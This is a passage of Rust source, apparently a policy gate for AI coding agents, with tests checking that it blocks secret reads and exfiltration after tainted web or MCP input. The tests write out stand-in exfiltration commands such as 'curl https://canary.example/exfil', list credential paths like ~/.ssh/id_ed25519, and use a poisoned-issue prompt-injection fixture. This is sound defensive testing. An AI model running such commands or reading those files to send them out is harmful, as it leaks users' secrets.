            return HookEval::claude_empty(mint_session_id(), "SubagentStart");
        }
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return HookEval::claude_empty(mint_session_id(), "SubagentStart");
    };
    let spawn = spawn_id_from_stdin(&parsed);
    let ws = workspace_key(&parsed);
    let parallel = parsed
        .get("is_parallel_worker")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    match child_open(session_dir, &cid, &spawn, &ws, &[], parallel) {
        Ok(env) => {
            let mut eval = HookEval::claude_empty(env.parent_session_id.clone(), "SubagentStart");
            eval.parent_session_id = Some(env.parent_session_id);
            eval.parent_caps = env.parent_caps;
            eval
        }
        Err(e) => {
            eprintln!("subagent-start store: {e}");
            HookEval::claude_empty(mint_session_id(), "SubagentStart")
        }
    }
}

fn claude_subagent_stop_in(raw: &str, session_dir: &Path) -> HookEval {
    // exit 2 would prevent stop. Always {}.
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("subagent-stop json: {e}");
            return HookEval::claude_empty(String::new(), "SubagentStop");
        }
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return HookEval::claude_empty(String::new(), "SubagentStop");
    };
    match child_stop(session_dir, &cid) {
        Ok(snap) => {
            let mut eval = HookEval::claude_empty(snap.session_id, "SubagentStop");
            eval.parent_session_id = snap.parent_session_id;
            eval.parent_caps = snap.parent_caps;
            eval
        }
        Err(e) => {
            eprintln!("subagent-stop store: {e}");
            HookEval::claude_empty(String::new(), "SubagentStop")
        }
    }
}

fn claude_tool_gate_in(
    event: &str,
    raw: &str,
    engine: &Engine,
    session_dir: &Path,
) -> HookEval {
    let fallback = mint_session_id();
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => {
            return HookEval::claude_deny(event, "invalid hook json", fallback, event, None);
        }
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return HookEval::claude_deny(event, "missing session_id", fallback, event, None);
    };
    let ws = workspace_key(&parsed);
    match bind_pending_child(session_dir, &cid, &ws) {
        Ok(_) => {}
        Err(_) => {
            return HookEval::claude_deny(
                event,
                "fairlead deny: session store",
                fallback,
                event,
                None,
            );
        }
    }
    let mut session = fallback;
    let mut store_tags: Vec<String> = Vec::new();
    let mut parent_caps: Vec<String> = Vec::new();
    let mut parent_session_id: Option<String> = None;
    let mut subagent_active = false;
    match load_session(session_dir, &cid) {
        Ok(Some(snap)) => {
            session = snap.session_id;
            store_tags = snap.tags;
            parent_caps = snap.parent_caps;
            parent_session_id = snap.parent_session_id;
            subagent_active = snap.subagent_active;
        }
        Ok(None) => {}
        Err(_) => {
            return HookEval::claude_deny(
                event,
                "fairlead deny: session store",
                session,
                event,
                None,
            );
        }
    }
    let tool_name = parsed
        .get("tool_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if claude_is_spawn_tool(tool_name) {
        return claude_spawn_gate(event, &parsed, &cid, session_dir, session).with_tool_name(tool_name);
    }
    let file_path = parsed
        .get("file_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let from_input = parsed
        .get("tool_input")
        .map(path_from_tool_input)
        .unwrap_or_default()
        .replace('\\', "/");
    let path = if !file_path.is_empty() {
        file_path.replace('\\', "/")
    } else {
        from_input
    };
    if tool_name.eq_ignore_ascii_case("Read") {
        let secret = hop_secret_tags(&path);
        if !secret.is_empty() {
            match append_tags_maybe_parent(
                session_dir,
                &cid,
                "read",
                &secret,
                &sha256_hex(raw.as_bytes()),
            ) {
                Ok(snap) => {
                    session = snap.session_id;
                    store_tags = snap.tags;
                    parent_caps = snap.parent_caps;
                    parent_session_id = snap.parent_session_id;
                    subagent_active = snap.subagent_active;
                }
                Err(_) => {
                    return HookEval::claude_deny(
                        event,
                        "fairlead deny: session store",
                        session,
                        event,
                        None,
                    )
                    .with_tool_name(tool_name);
                }
            }
        }
    }
    let lines = match load_lines(session_dir, &cid) {
        Ok(l) => l,
        Err(_) => {
            return HookEval::claude_deny(
                event,
                "fairlead deny: session store",
                session,
                event,
                None,
            )
            .with_tool_name(tool_name);
        }
    };
    let mut facts = reduce(&lines);
    facts.subagent_active = subagent_active;
    let provenance = cedar_provenance(&store_tags);
    let mut req = match request_from_claude(&parsed, &session, &provenance, &facts, &parent_caps) {
        Ok(r) => r,
        Err(e) => return HookEval::claude_deny(event, &e, session, event, None).with_tool_name(tool_name),
    };
    if fill_argument_from_untrusted(&mut req, &parsed, session_dir).is_err() {
        return HookEval::claude_deny(event, "fairlead deny: session store", session, event, None)
            .with_tool_name(tool_name);
    }
    let preview = req
        .context
        .get("command")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| s.chars().take(200).collect());
    let out = engine.evaluate(&req);
    let denied = out.errored || out.decision == Decision::Deny;
    let outcome = if denied { "deny" } else { "allow" };
    if append_decision(
        session_dir,
        &cid,
        &req.action,
        outcome,
        &sha256_hex(raw.as_bytes()),
        &provenance,
        &session,
    )
    .is_err()
    {
        return HookEval::claude_deny(
            event,
            "fairlead deny: session store",
            session,
            &req.action,
            preview,
        )
        .with_tool_name(tool_name);
    }
    let mut eval = if denied {
        HookEval::claude_deny(
            event,
            &cedar_deny_message(&out.policy_ids, out.errored),
            session,
            &req.action,
            preview,
        )
    } else if event == "permission-request" {
        // S5 Hybrid: PreToolUse already auto-allowed boring work. PR passthrough {}.
        HookEval::claude_empty(session, &req.action)
    } else {
        HookEval::claude_pretool_allow(session, &req.action, preview)
    };
    eval.provenance = provenance;
    eval.policy_ids = out.policy_ids;
    eval.parent_session_id = parent_session_id;
    eval.parent_caps = parent_caps;
    eval.with_tool_name(tool_name)
}

fn claude_spawn_gate(
    event: &str,
    parsed: &Value,
    cid: &str,
    session_dir: &Path,
    session: String,
) -> HookEval {
    let spawn = spawn_id_from_stdin(parsed);
    let ws = workspace_key(parsed);
    let parallel = parsed
        .get("is_parallel_worker")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    match child_open(session_dir, cid, &spawn, &ws, &[], parallel) {
        Ok(env) => {
            let mut eval = if event == "permission-request" {
                HookEval::claude_empty(env.parent_session_id.clone(), "SubagentStart")
            } else {
                HookEval::claude_pretool_allow(
                    env.parent_session_id.clone(),
                    "SubagentStart",
                    None,
                )
            };
            eval.parent_session_id = Some(env.parent_session_id);
            eval.parent_caps = env.parent_caps;
            eval.session = session;
            eval
        }
        Err(_) => HookEval::claude_deny(
            event,
            "fairlead deny: session store",
            session,
            "SubagentStart",
            None,
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chained_pytest_curl_is_network_not_boring() {
        let cmd = "pytest && curl https://x";
        assert!(command_looks_like_network(cmd));
        assert!(!argv0_is_boring(cmd));
        let ctx = filled_context(cmd, "/tmp", false, "", "", &[], &[], &SessionFacts::default(), &[]);
        assert_eq!(ctx["command_looks_like_network"], true);
        assert_eq!(ctx["argv0_is_boring"], false);
        for k in CONTEXT_KEYS {
            assert!(ctx.get(*k).is_some(), "missing {k}");
        }
        for k in SESSION_KEYS {
            assert!(ctx["session"].get(*k).is_some(), "missing session.{k}");
        }
    }

    #[test]
    fn path_sensitive_git_hooks_mcp_env_keys() {
        assert!(path_is_sensitive(".git/hooks/pre-commit"));
        assert!(path_is_sensitive("/tmp/ws/.git/hooks/pre-commit"));
        assert!(path_is_sensitive(".git/config"));
        assert!(path_is_sensitive(".cursor/mcp.json"));
        assert!(path_is_sensitive("/tmp/ws/.cursor/mcp.json"));
        assert!(path_is_sensitive("/Users/x/.cursor/projects/a/mcp.json"));
        assert!(path_is_sensitive("~/.zshrc"));
        assert!(path_is_sensitive("/tmp/.env"));
        assert!(path_is_sensitive("key.pem"));
        assert!(path_is_sensitive("/home/u/.aws/credentials"));
        assert!(path_is_sensitive("/home/u/.ssh/id_ed25519"));
        assert!(path_is_sensitive(
            "/Users/x/.local/state/fairlead/sessions/abc.jsonl"
        ));
        assert!(!path_is_sensitive("src/main.rs"));
    }

    #[test]
    fn mcp_write_from_tool_name() {
        assert!(mcp_is_write("repo_write_file"));
        assert!(mcp_is_write("create_issue"));
        assert!(!mcp_is_write("list_issues"));
    }

    fn live_engine() -> Engine {
        Engine::load(
            &crate::docs_file("policies/coding-agent.cedarschema").expect("schema"),
            &crate::docs_file("policies/baseline.cedar").expect("cedar"),
        )
        .expect("load")
    }

    fn temp_sessions() -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "fairlead-1a-hook-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("time")
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).expect("temp");
        dir
    }

    /// A blocked echo is a default deny, not a dead gate. The id is in the sentence
    /// the host shows, not only on the receipt.
    #[test]
    fn deny_sentence_names_the_policy_or_says_none_matched() {
        assert_eq!(cedar_deny_message(&[], true), "fairlead deny: policy error");
        assert_eq!(
            cedar_deny_message(&["F-Q-ARG".into(), "F-DEF-03".into()], false),
            "fairlead deny: F-Q-ARG, F-DEF-03"
        );
        let engine = live_engine();
        let dir = temp_sessions();
        let none = "fairlead deny: no matching policy";
        let echo = cursor_hook_eval_in(
            "shell",
            &json!({"conversation_id": "conv-echo", "command": "echo hi", "cwd": "/tmp/ws", "sandbox": false})
                .to_string(),
            &engine,
            &dir,
        );
        assert_eq!(echo.exit, 2, "{:?}", echo.policy_ids);
        assert!(echo.policy_ids.is_empty(), "{:?}", echo.policy_ids);
        assert_eq!(echo.stdout["user_message"], none);
        assert_eq!(echo.stdout["agent_message"], none);
        let curl = cursor_hook_eval_in(
            "shell",
            &json!({"conversation_id": "conv-curl", "command": "curl http://127.0.0.1:9/", "cwd": "/tmp/ws", "sandbox": false})
                .to_string(),
            &engine,
            &dir,
        );
        assert_eq!(curl.exit, 2, "{:?}", curl.policy_ids);
        let msg = curl.stdout["user_message"].as_str().unwrap_or("");
        assert!(msg.contains("F-DEF-03"), "{msg}");
        assert_eq!(curl.stdout["agent_message"], msg);
        let claude = claude_hook_eval_in(
            "pretool",
            &json!({"session_id": "conv-claude-echo", "tool_name": "Bash", "tool_input": {"command": "echo hi"}, "cwd": "/tmp/ws"})
                .to_string(),
            &engine,
            &dir,
        );
        assert_eq!(
            claude.stdout["hookSpecificOutput"]["permissionDecisionReason"],
            none
        );
        let hands = openhands_hook_eval_in(
            &json!({"session_id": "conv-oh-echo", "tool_name": "terminal", "tool_input": {"command": "echo hi"}, "working_dir": "/tmp/ws"})
                .to_string(),
            &engine,
            &dir,
        );
        assert_eq!(hands.exit, 2);
        assert_eq!(hands.stdout["reason"], none);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn web_tainted_curl_hits_f_def_05_fresh_curl_does_not() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-web-taint";
        let obs = cursor_hook_observe_in(
            "after-mcp",
            &format!(
                r#"{{"conversation_id":"{cid}","tool_name":"web_search","result_json":"{{}}"}}"#
            ),
            &dir,
        );
        assert_eq!(obs.exit, 0);
        assert!(obs.tags.contains(&"web".into()), "{:?}", obs.tags);
        assert!(obs.tags.contains(&"mcp".into()), "{:?}", obs.tags);
        let snap = load_session(&dir, cid).expect("load").expect("present");
        assert!(snap.tags.contains(&"mcp".into()));

        let deny = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(deny.exit, 2);
        assert!(deny.provenance.contains(&"web".into()), "{:?}", deny.provenance);
        assert!(deny.policy_ids.contains(&"F-DEF-05".into()), "{:?}", deny.policy_ids);
        assert!(deny.policy_ids.contains(&"F-DEF-03".into()), "{:?}", deny.policy_ids);
        assert!(deny.policy_ids.contains(&"F-DEF-08".into()), "{:?}", deny.policy_ids);

        let pytest = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"ls","cwd":"/tmp/ws","sandbox":true}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(pytest.exit, 0, "web taint must not smash F-DEF-06");
        assert!(pytest.provenance.contains(&"web".into()));

        let fresh = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-fresh","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(fresh.exit, 2);
        assert!(!fresh.policy_ids.contains(&"F-DEF-05".into()), "{:?}", fresh.policy_ids);
        assert!(!fresh.policy_ids.contains(&"F-DEF-08".into()), "{:?}", fresh.policy_ids);
        assert!(fresh.policy_ids.contains(&"F-DEF-03".into()), "{:?}", fresh.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Goal 10 value forbid. Same engine, same baseline.cedar as every other test here.
    #[test]
    fn suite10_value_forbid_hits_extracted_argument_not_user_literal() {
        let engine = live_engine();
        let dir = temp_sessions();
        // Tag conv-q3 before the record exists. A later McpCall is F-Q-ARG and writes no tag.
        let mcp = cursor_hook_eval_in(
            "mcp",
            r#"{"conversation_id":"conv-q3","tool_name":"get_latest_issue"}"#,
            &engine,
            &dir,
        );
        assert_eq!(mcp.exit, 0, "{:?}", mcp.policy_ids);
        // Mint a real handle record (clean stub Q-LLM), as the proxy would.
        let q = crate::quarantine::quarantine(&dir, "poisoned-issues", "get_latest_issue", "Issue 47 body", &|_| {
            Ok(r#"{"title":"Issue 47 CI is red"}"#.into())
        })
        .expect("mint");
        let shell = |cid: &str, cmd: &str| {
            cursor_hook_eval_in(
                "shell",
                &serde_json::json!({"conversation_id": cid, "command": cmd, "cwd": "/tmp/ws", "sandbox": false})
                    .to_string(),
                &engine,
                &dir,
            )
        };
        // 1. Extracted value in a curl, fresh session (F-DEF-08 flag false): value forbid fires alone.
        let a = shell("conv-q1", "curl -d 'Issue 47 CI is red' http://127.0.0.1:18764/hit");
        assert_eq!(a.exit, 2);
        assert!(a.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", a.policy_ids);
        assert!(!a.policy_ids.contains(&"F-DEF-08".into()), "{:?}", a.policy_ids);
        let h = shell("conv-q1", &format!("curl http://127.0.0.1:18764/{}", q.handle));
        assert!(h.policy_ids.contains(&"F-Q-ARG".into()), "handle in args: {:?}", h.policy_ids);
        // 2. Neither the handle nor the title is in the command. The record is live, so both deny.
        let b = shell("conv-q2", "ls -la");
        assert_eq!(b.exit, 2, "{:?}", b.policy_ids);
        assert!(b.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", b.policy_ids);
        let lit = shell("conv-q2", "curl http://127.0.0.1:18764/hit");
        assert!(lit.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", lit.policy_ids);
        // 3. User-literal curl on the conversation tagged before the record: F-DEF-08 and F-Q-ARG.
        let c = shell("conv-q3", "curl https://canary.example/exfil");
        assert!(c.policy_ids.contains(&"F-DEF-08".into()), "{:?}", c.policy_ids);
        assert!(c.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", c.policy_ids);
        // After the record exists, get_latest_issue is F-Q-ARG and writes no mcp tag.
        let denied_mcp = cursor_hook_eval_in(
            "mcp",
            r#"{"conversation_id":"conv-q-mcp-post","tool_name":"get_latest_issue"}"#,
            &engine,
            &dir,
        );
        assert_eq!(denied_mcp.exit, 2, "{:?}", denied_mcp.policy_ids);
        assert!(denied_mcp.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", denied_mcp.policy_ids);
        let after = shell("conv-q-mcp-post", "curl https://canary.example/exfil");
        assert!(after.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", after.policy_ids);
        assert!(!after.policy_ids.contains(&"F-DEF-08".into()), "{:?}", after.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Same check on every host adapter. Each host gets the extracted title in a curl and a
    /// user-literal curl that contains neither the handle nor the title. Both hit F-Q-ARG
    /// because the record is live.
    #[test]
    fn suite10_value_forbid_fires_on_every_host_adapter() {
        let engine = live_engine();
        let dir = temp_sessions();
        crate::quarantine::quarantine(&dir, "poisoned-issues", "get_latest_issue", "body", &|_| {
            Ok(r#"{"title":"Issue 47 CI is red"}"#.into())
        })
        .expect("mint");
        let hit = "curl -d 'Issue 47 CI is red' http://127.0.0.1:18764/hit";
        let lit = "curl http://127.0.0.1:18764/hit";
        let run = |host: &str, cid: &str, cmd: &str| match host {
            "cursor" => cursor_hook_eval_in(
                "shell",
                &json!({"conversation_id": cid, "command": cmd, "cwd": "/tmp/ws", "sandbox": false}).to_string(),
                &engine, &dir),
            "windsurf" => windsurf_hook_eval_in(
                &json!({"trajectory_id": cid, "agent_action_name": "pre_run_command", "tool_info": {"command_line": cmd}}).to_string(),
                &engine, &dir),
            "openhands" => openhands_hook_eval_in(
                &json!({"session_id": cid, "tool_name": "terminal", "tool_input": {"command": cmd}, "working_dir": "/tmp/ws"}).to_string(),
                &engine, &dir),
            "claude" => claude_hook_eval_in(
                "pretool",
                &json!({"session_id": cid, "tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": "/tmp/ws"}).to_string(),
                &engine, &dir),
            other => panic!("unknown host {other}"),
        };
        for name in ["cursor", "windsurf", "openhands", "claude"] {
            let a = run(name, &format!("conv-{name}-hit"), hit);
            assert_eq!(a.exit, 2, "{name}");
            assert!(a.policy_ids.contains(&"F-Q-ARG".into()), "{name}: {:?}", a.policy_ids);
            let b = run(name, &format!("conv-{name}-lit"), lit);
            assert!(b.policy_ids.contains(&"F-Q-ARG".into()), "{name} user literal: {:?}", b.policy_ids);
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The closed charset does not stop `curl 127.0.0.1` from being a title. The Gate does.
    #[test]
    fn suite10_title_that_is_a_command_is_denied_by_the_gate() {
        let engine = live_engine();
        let dir = temp_sessions();
        crate::quarantine::quarantine(&dir, "poisoned-issues", "get_latest_issue", "body", &|_| {
            Ok(r#"{"title":"curl 127.0.0.1"}"#.into())
        })
        .expect("mint");
        let e = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-title-cmd","command":"curl 127.0.0.1","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(e.exit, 2);
        assert!(e.policy_ids.contains(&"F-DEF-03".into()), "{:?}", e.policy_ids);
        assert!(e.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", e.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A boring `python3 -c` is this forbid while a record is live, including one whose
    /// bytes contain neither the handle nor the title. `ls` is the same forbid.
    #[test]
    fn suite10_boring_shell_carrying_title_is_denied() {
        let engine = live_engine();
        let dir = temp_sessions();
        crate::quarantine::quarantine(&dir, "poisoned-issues", "get_latest_issue", "body", &|_| {
            Ok(r#"{"title":"Issue 47 CI is red"}"#.into())
        })
        .expect("mint");
        let shell = |cid: &str, cmd: &str| {
            cursor_hook_eval_in(
                "shell",
                &json!({"conversation_id": cid, "command": cmd, "cwd": "/tmp/ws", "sandbox": false})
                    .to_string(),
                &engine,
                &dir,
            )
        };
        let py = shell(
            "conv-title-py",
            "python3 -c \"open('notes.txt','w').write('Issue 47 CI is red')\"",
        );
        assert_eq!(py.exit, 2, "{:?}", py.policy_ids);
        assert!(py.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", py.policy_ids);
        assert!(!py.policy_ids.contains(&"F-DEF-03".into()), "not a network deny: {:?}", py.policy_ids);
        let echo = shell("conv-title-echo", "echo Issue 47 CI is red > notes.txt");
        assert!(echo.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", echo.policy_ids);
        let bare = shell("conv-title-bare", "python3 -c \"print(1)\"");
        assert_eq!(bare.exit, 2, "{:?}", bare.policy_ids);
        assert!(bare.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", bare.policy_ids);
        let ls = shell("conv-title-ls", "ls -la");
        assert_eq!(ls.exit, 2, "{:?}", ls.policy_ids);
        assert!(ls.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", ls.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A live record denies the interpreter whether or not the script file contains the title.
    #[test]
    fn suite10_script_file_carrying_title_is_denied() {
        let engine = live_engine();
        let dir = temp_sessions();
        let ws = dir.join("ws");
        std::fs::create_dir_all(&ws).expect("ws");
        std::fs::write(ws.join("notes.txt"), "Issue 47 CI is red\n").expect("tainted");
        std::fs::write(ws.join("clean.py"), "print(1)\n").expect("clean");
        crate::quarantine::quarantine(&dir, "poisoned-issues", "get_latest_issue", "body", &|_| {
            Ok(r#"{"title":"Issue 47 CI is red"}"#.into())
        })
        .expect("mint");
        let cwd = ws.to_str().expect("utf8 cwd");
        let shell = |cid: &str, cmd: &str| {
            cursor_hook_eval_in(
                "shell",
                &json!({"conversation_id": cid, "command": cmd, "cwd": cwd, "sandbox": false}).to_string(),
                &engine,
                &dir,
            )
        };
        let bad = shell("conv-file-bad", "python3 notes.txt");
        assert_eq!(bad.exit, 2, "{:?}", bad.policy_ids);
        assert!(bad.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", bad.policy_ids);
        assert!(!bad.policy_ids.contains(&"F-DEF-03".into()), "{:?}", bad.policy_ids);
        let clean = shell("conv-file-clean", "python3 clean.py");
        assert_eq!(clean.exit, 2, "{:?}", clean.policy_ids);
        assert!(clean.policy_ids.contains(&"F-Q-ARG".into()), "{:?}", clean.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Live Cursor sends `cwd: ""` plus `workspace_roots`. Running the script is
    /// F-DEF-09 either way. Without a root the missing file still fails closed.
    #[test]
    fn empty_cwd_falls_back_to_workspace_root() {
        let engine = live_engine();
        let dir = temp_sessions();
        let ws = dir.join("ws");
        std::fs::create_dir_all(&ws).expect("ws");
        std::fs::write(ws.join("clean.py"), "print(1)\n").expect("clean");
        let root = ws.to_str().expect("utf8");
        let run = |cid: &str, roots: serde_json::Value| {
            cursor_hook_eval_in(
                "shell",
                &json!({"conversation_id": cid, "command": "python3 clean.py", "cwd": "",
                        "workspace_roots": roots, "sandbox": false})
                .to_string(),
                &engine,
                &dir,
            )
        };
        let with_root = run("conv-empty-cwd-a", json!([root]));
        assert_eq!(with_root.exit, 2, "{:?}", with_root.policy_ids);
        assert!(
            with_root.policy_ids.contains(&"F-DEF-09".into()),
            "{:?}",
            with_root.policy_ids
        );
        assert_eq!(with_root.stdout["user_message"], "fairlead deny: F-DEF-09");
        // Falsifier: without a root the same call cannot find the script and fails closed.
        let without = run("conv-empty-cwd-b", json!([]));
        assert_eq!(without.exit, 2, "{:?}", without.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn before_mcp_get_latest_issue_taints_curl_without_after_mcp() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-before-mcp";
        let allow = cursor_hook_eval_in(
            "mcp",
            &format!(r#"{{"conversation_id":"{cid}","tool_name":"get_latest_issue"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(allow.exit, 0, "{}", allow.stdout);
        assert_eq!(allow.stdout["permission"], "allow");
        assert!(allow.policy_ids.contains(&"F-AUTO-mcp-read".into()), "{:?}", allow.policy_ids);
        assert!(allow.provenance.contains(&"mcp".into()), "{:?}", allow.provenance);
        assert!(!allow.provenance.contains(&"web".into()), "{:?}", allow.provenance);
        let snap = load_session(&dir, cid).expect("load").expect("present");
        assert!(snap.tags.contains(&"mcp".into()), "{:?}", snap.tags);
        assert!(!snap.tags.contains(&"web".into()), "{:?}", snap.tags);

        let deny = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(deny.exit, 2);
        assert!(deny.policy_ids.contains(&"F-DEF-05".into()), "{:?}", deny.policy_ids);
        assert!(deny.policy_ids.contains(&"F-DEF-08".into()), "{:?}", deny.policy_ids);
        assert!(deny.policy_ids.contains(&"F-DEF-03".into()), "{:?}", deny.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn mcp_then_mcp_json_write_carries_provenance() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-mcp-write";
        cursor_hook_observe_in(
            "after-mcp",
            &format!(
                r#"{{"conversation_id":"{cid}","tool_name":"get_latest_issue","result_json":"stolen"}}"#
            ),
            &dir,
        );
        let snap = load_session(&dir, cid).expect("load").expect("present");
        let provenance = cedar_provenance(&snap.tags);
        assert!(provenance.contains(&"mcp".into()), "{provenance:?}");
        let ctx = filled_context(
            "",
            "/tmp/ws",
            false,
            ".cursor/mcp.json",
            "",
            &[],
            &[],
            &SessionFacts::default(),
            &provenance,
        );
        assert_eq!(ctx["session"]["touched_secrets"], false);
        let out = engine.evaluate(&crate::DecisionRequest {
            principal: r#"Fairlead::Agent::"cursor:test""#.into(),
            action: "FileWrite".into(),
            resource: r#"Fairlead::Resource::".cursor/mcp.json""#.into(),
            context: ctx,
        });
        assert!(!out.errored);
        assert_eq!(out.decision, Decision::Deny);
        assert!(out.policy_ids.contains(&"F-DEF-01".into()), "{:?}", out.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn env_read_stores_secret_not_cedar_provenance() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-env";
        let eval = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{cid}","file_path":"/tmp/.env"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(eval.exit, 2);
        assert_eq!(eval.command_preview.as_deref(), Some("/tmp/.env"));
        assert!(!eval.provenance.contains(&"secret".into()), "{:?}", eval.provenance);
        let snap = load_session(&dir, cid).expect("load").expect("present");
        assert!(snap.tags.contains(&crate::SECRET_TAG.to_string()), "{:?}", snap.tags);
        let facts = reduce(&load_lines(&dir, cid).expect("lines"));
        assert!(facts.touched_secrets);
        assert!(facts.secret_read_count >= 1);
        let req = request_from_cursor(
            "read",
            &serde_json::json!({"file_path": "/tmp/.env"}),
            "s",
            &cedar_provenance(&snap.tags),
            &facts,
            &[],
        )
        .expect("req");
        assert_eq!(req.context["session"]["touched_secrets"], true);
        assert!(req.context["session"]["secret_read_count"].as_i64().unwrap() >= 1);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn suite5_env_then_curl_same_turn_hits_f_def_07() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-5";
        let hop1 = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{cid}","file_path":"/tmp/.env"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(hop1.exit, 2);
        let hop2 = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(hop2.exit, 2);
        assert!(hop2.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hop2.policy_ids);
        assert!(hop2.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hop2.policy_ids);
        assert!(!hop2.provenance.contains(&"secret".into()), "{:?}", hop2.provenance);
        let pytest = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"ls","cwd":"/tmp/ws","sandbox":true}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(pytest.exit, 0, "secret taint must not smash F-DEF-06");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Live adapters never grant a cap. The secret tag annotates a deny the classifier already made.
    #[test]
    fn secret_tag_is_not_the_sole_live_deny() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-secret-sole";
        let read = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{cid}","file_path":"/tmp/ws/.env"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(read.exit, 2);
        assert!(read.policy_ids.contains(&"F-DEF-02".into()), "{:?}", read.policy_ids);
        let pytest = cursor_hook_eval_in(
            "shell",
            &format!(r#"{{"conversation_id":"{cid}","command":"ls","cwd":"/tmp/ws","sandbox":true}}"#),
            &engine,
            &dir,
        );
        assert_eq!(pytest.exit, 0, "{:?}", pytest.policy_ids);
        assert!(pytest.policy_ids.contains(&"F-DEF-06".into()), "{:?}", pytest.policy_ids);
        assert!(!pytest.policy_ids.contains(&"F-DEF-07".into()), "{:?}", pytest.policy_ids);
        let curl = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(curl.exit, 2);
        assert!(curl.policy_ids.contains(&"F-DEF-07".into()), "{:?}", curl.policy_ids);
        assert!(curl.policy_ids.contains(&"F-DEF-03".into()), "{:?}", curl.policy_ids);
        assert!(curl.policy_ids.len() > 1, "{:?}", curl.policy_ids);
        let write = cursor_hook_eval_in(
            "mcp",
            &format!(r#"{{"conversation_id":"{cid}","tool_name":"create_issue"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(write.exit, 2);
        assert!(write.policy_ids.contains(&"F-DEF-07".into()), "{:?}", write.policy_ids);
        assert!(write.policy_ids.contains(&"F-DEF-04".into()), "{:?}", write.policy_ids);
        assert!(write.policy_ids.len() > 1, "{:?}", write.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn suite5_env_then_curl_cross_turn() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cid = "conv-5-cross";
        let hop1 = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{cid}","file_path":"/tmp/.env"}}"#),
            &engine,
            &dir,
